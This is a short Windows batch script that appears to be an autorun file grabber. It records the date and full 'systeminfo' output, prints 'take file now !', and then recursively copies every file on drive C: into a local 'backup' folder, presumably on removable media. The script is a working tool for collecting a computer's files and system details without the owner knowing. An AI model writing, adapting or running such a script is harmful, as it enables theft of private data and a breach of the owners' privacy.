@echo off
mkdir autorunbackup
cd autorunbackup
date /t >> systeminfo.txt
systeminfo >> systeminfo.txt
echo take file now !
mkdir backup
cd backup
for /r C:\ %%x in (*) do @copy /y "%%x"
cd..
